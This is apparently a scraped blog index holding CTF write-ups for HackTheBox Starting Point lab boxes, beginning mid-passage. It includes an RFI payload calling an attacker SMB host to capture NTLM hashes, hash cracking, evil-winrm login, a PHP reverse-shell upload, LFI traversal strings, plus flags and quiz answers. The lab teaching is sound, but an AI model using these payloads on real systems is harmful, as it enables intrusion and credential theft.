to:\nhttp://unika.htb/index.php?page=//10.10.14.165/any_file_name\nHash acquired!\nWe just need to crack it.\njohn the ripper john (john the ripper) is one commonly used hash cracking tools. Let\u0026rsquo;s copy this hash from Responder and throw it into a text file such as hashed.txt. Let john do the rest:\njohn -w=/usr/share/wordlists/rockyou.txt hashed.txt\n1 2 3 4 5 6 7 8 Using default input encoding: UTF-8 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status badminton (Administrator) 1g 0:00:00:00 DONE (2022-10-25 23:58) 100.0g/s 409600p/s 409600c/s 409600C/s slimshady..oooooo Use the \u0026#34;--show --format=netntlmv2\u0026#34; options to display all of the cracked passwords reliably Session completed. There we go\u0026hellip; Administrator:badminton. Time to exploit.\nWinRM winrm (Windows Remote Management) is a protocol that allows devices to access a system remotely. evil-winrm is a tool that allows us to connect to a windows machine and still be able to use Powershell on Linux.\nevil-winrm -i 10.129.245.210 -u Administrator -p badminton\nWe are in. Now we can run a PowerShell command to look for the flag so we don\u0026rsquo;t have to!\nGet-ChildItem -Path C:\\ -Filter flag.txt -Recurse\nBox popped.\nQuestions When visiting the web service using the IP address, what is the domain that we are being redirected to? unika.htb Which scripting language is being used on the server to generate webpages? php What is the name of the URL parameter which is used to load different language versions of the webpage? page Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo; ../../../../../../../../windows/system32/drivers/etc/hosts Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo; //10.10.14.6/somefile What does NTLM stand for? New Technology Lan Manager Which flag do we use in the Responder utility to specify the network interface? -I There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?. John The Ripper What is the password for the administrator user? badminton We\u0026rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? 5985 flag: ea81b7afddd03efaa0945333ed147fac\nThree nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Nmap 7.92 scan initiated Thu Oct 27 13:35:55 2022 as: nmap -sC -sV -oA nmap/three -T4 10.129.37.145 Nmap scan report for 10.129.37.145 Host is up (0.072s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA) | 256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA) |_ 256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: The Toppers |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Oct 27 13:36:06 2022 -- 1 IP address (1 host up) scanned in 10.71 seconds http After looking around at the website, there were two main things that stood out.\nEmail: mail@thetoppers.htb gives us the domain thetoppers.htb Dropping a note in the #content section gives us http://10.129.37.145/action_page.php?Name=test1\u0026amp;Email=test2\u0026amp;Message=test3 We can add thetoppers.htb to /etc/hosts and check for subdirectories and subdomains.\ngobuster This section caused problems for me.\nsubdirectories\nFirst, I looked for subdirectories:\ngobuster dir -u http://10.129.37.145 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\nThis proved unhelpful with only the /images directory found.\nsubdomains\nI then tried running gobuster to look for subdomains hosted on the same IP using the vhost feature.\ngobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -z\nI tested several of the number outputs by adding them to /etc/hosts, but none of them worked. I then updated the wordlist to remove all of these inputs that contain numbers through a simple python script.\nsudo gobuster vhost -u http://thetoppers.htb -w subdomain_wl_no_numbers.txt -z -o gobuster.out\nThis only found the following subdomain (which failed after testing)\n1 Found: gc._msdcs Status: 400 [Size: 306] ffuf Next, I tried switching to ffuf as gobuster seemed to be failing me.\nffuf -c -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \u0026quot;Host: FUZZ.thetopper.htb\u0026quot; -fc 200\nStill, no luck.\nAfter much trial and error, I ended up taking a look at the htb writeup for this challenge at this point. To my surprise, they simply run gobuster as I did, and find s3.thetoppers.htb\nEven after knowing the output, I spent much time testing ffuf and gobuster with no avail. I even tried text files only containing s3, but this was always missed by both tools. I even tried reseting the target machine and starting over, but this also failed. So, I\u0026rsquo;m going to chalk this up to something on HackTheBox\u0026rsquo;s end and continue pretending I found the s3 subdomain.\nDon\u0026rsquo;t forget to add s3.thetoppers.htb to /etc/hosts\nNOW, moving on\u0026hellip;\ns3 The Amazon S3 bucket (or s3 for short) is a cloud-based storage service which contains s3 objects. We can use the awscli (sudo apt install awscli) to try to interact with this bucket.\naws configure Then we can look at all the s3 buckets:\naws --endpoint=http://s3.thetoppers.htb s3 ls\nand all the objects in a bucket: aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb\nThere seems nothing of particular value in the bucket, but we can try and add a malicious php file and get a reverse shell. I typically take pentestmonkey\u0026rsquo;s template and change the $ip and port accordingly. To upload:\naws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb\nWe are in.\nLet\u0026rsquo;s search for the flag and be done 😁\nQuestions How many TCP ports are open? 2 What is the domain of the email address provided in the \u0026ldquo;Contact\u0026rdquo; section of the website? thetoppers.htb In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? /etc/hosts Which sub-domain is discovered during further enumeration? s3.thetoppers.htb Which service is running on the discovered sub-domain? Amazon s3 Which command line utility can be used to interact with the service running on the discovered sub-domain? awscli Which command is used to set up the AWS CLI installation? aws configure What is the command used by the above utility to list all of the S3 buckets? aws s3 ls This server is configured to run files written in what web scripting language? php flag: a980d99281a28d638ac68b9bf9453c2b\n","permalink":"https://woadey.lol/posts/tier1/","summary":"Short writeups for each of the Starting Point boxes on HTB - Tier 1","title":"HTB: Learn the basics of Penetration Testing - Tier 1"},{"content":"Meow nmap Starting the chall with an nmap scan to see which ports are open.\n1 2 3 4 5 6 7 8 9 # Nmap 7.92 scan initiated Fri Apr 29 15:39:25 2022 as: nmap -sV -sC -oA ./meow/meow 10.129.251.259 Nmap scan report for 10.129.251.259 Host is up (0.17s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 23/tcp open telnet? Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 29 15:40:00 2022 -- 1 IP address (1 host up) scanned in 35.35 seconds telnet telnet is an older and less secure network protocol that allows access to another device or server remotely. it happens to have an open port. Let\u0026rsquo;s try to connect.\nroot worked first try! ls; cat flag.txt to get the flag.\nQuestions What does the acronym VM stand for? Virtual Machine What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It\u0026rsquo;s also known as a console or shell. terminal What service do we use to form our VPN connection into HTB labs? openvpn What is the abbreviated name for a \u0026rsquo;tunnel interface\u0026rsquo; in the output of your VPN boot-up sequence output? tun What tool do we use to test our connection to the target with an ICMP echo request? ping What is the name of the most common tool for finding open ports on a target? nmap What service do we identify on port 23/tcp during our scans? telnet What username is able to log into the target over telnet with a blank password? root flag: b40abdfe23665f766f9c61ecba8a4c19\nFawn nmap Run nmap on the box.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # Nmap 7.92 scan initiated Fri Apr 29 15:48:32 2022 as: nmap -sV -sC -oA nmap/fawn 10.129.143.56 Nmap scan report for 10.129.143.56 Host is up (0.088s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 32 Jun 04 2021 flag.txt | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.16.162 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 29 15:48:37 2022 -- 1 IP address (1 host up) scanned in 4.99 seconds FTP ftp (File Transfer Protocol) allows devices to upload, download and transfer files through the internet. However, this can be taken advantage of if configured poorly.\nLet\u0026rsquo;s connect via: ftp 10.129.143.56 and sign in as an anonymous user. Bingo, now just find the flag.\nQuestions What does the 3-letter acronym FTP stand for? File Transfer Protocol Which port does the FTP service listen on usually? 21 What acronym is used for the secure version of FTP? SFTP What is the command we can use to send an ICMP echo request to test our connection to the target? ping From your scans, what version is FTP running on the target? vsftpd 3.0.3 From your scans, what OS type is running on the target? Unix What is the command we need to run in order to display the \u0026lsquo;ftp\u0026rsquo; client help menu? ftp -h What is username that is used over FTP when you want to log in without having an account? anonymous What is the response code we get for the FTP message \u0026lsquo;Login successful\u0026rsquo;? 230 There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. ls What is the command used to download the file we found on the FTP server? get flag: 035db21c881520061c53e0536e44f815\nDancing nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 # Nmap 7.92 scan initiated Fri Apr 29 15:57:22 2022 as: nmap -sV -sC -oA nmap/dancing 10.129.24.249 Nmap scan report for 10.129.24.249 Host is up (0.075s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-04-30T00:00:27 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required |_clock-skew: 3h59m59s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 29 16:00:33 2022 -- 1 IP address (1 host up) scanned in 191.84 seconds smb smb (Server Message Block) is a network protocol that allows devices to share, open, and edit files on remote devices or servers. smbclient is a tool to harness this protocol.\nWe can list all the smb sharenames by smbclient -L 10.129.24.249. Now let\u0026rsquo;s try to connect to all of them via smbclient \\\\\\\\10.129.24.249\\\\\u0026lt;Sharename\u0026gt;\nWorkShares ftw! Now let\u0026rsquo;s look around and get the flag.\nQuestions What does the 3-letter acronym SMB stand for? Server Message Block What port does SMB use to operate at? 445 What is the service name for port 445 that came up in our Nmap scan? microsoft-ds What is the \u0026lsquo;flag\u0026rsquo; or \u0026lsquo;switch\u0026rsquo; we can use with the SMB tool to \u0026rsquo;list\u0026rsquo; the contents of the share? -L How many shares are there on Dancing? 4 What is the name of the share we are able to access in the end with a blank password? WorkShares What is the command we can use within the SMB shell to download the files we find? get flag: 5f61c10dffbc77a704d76016a22f1664\nRedeemer nmap 1 2 3 4 5 6 7 8 9 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-24 21:34 EDT Nmap scan report for 10.129.13.221 Host is up (0.069s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 6379/tcp open redis Redis key-value store 5.0.7 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 724.57 seconds redis redis (Remote Dictionary Server) is an in-memory data structure that can be used as a database, cache, or message broker. We can use redis-cli (sudo apt install redis-tools) to interact with the server:\nredis-cli -h 10.129.13.221 followed by info will give us some insight into the stored data. select 0 will allow us to select the database, and keys * will show all keys in the db. Profit!\nQuestions Which TCP port is open on the machine? 6379 Which service is running on the port that is open on the machine? redis What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database In-memory Database Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments. redis-cli Which flag is used with the Redis command-line utility to specify the hostname? -h Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? info What is the version of the Redis server being used on the target machine? 5.0.7 Which command is used to select the desired database in Redis? select How many keys are present inside the database with index 0? 4 Which command is used to obtain all the keys in a database? keys * flag: 03e1d2b376c37ab3f5319922053953eb\n","permalink":"https://woadey.lol/posts/tier0/","summary":"Short writeups for each of the Starting Point boxes on HTB - Tier 0","title":"HTB: Learn the basics of Penetration Testing - Tier 0"}]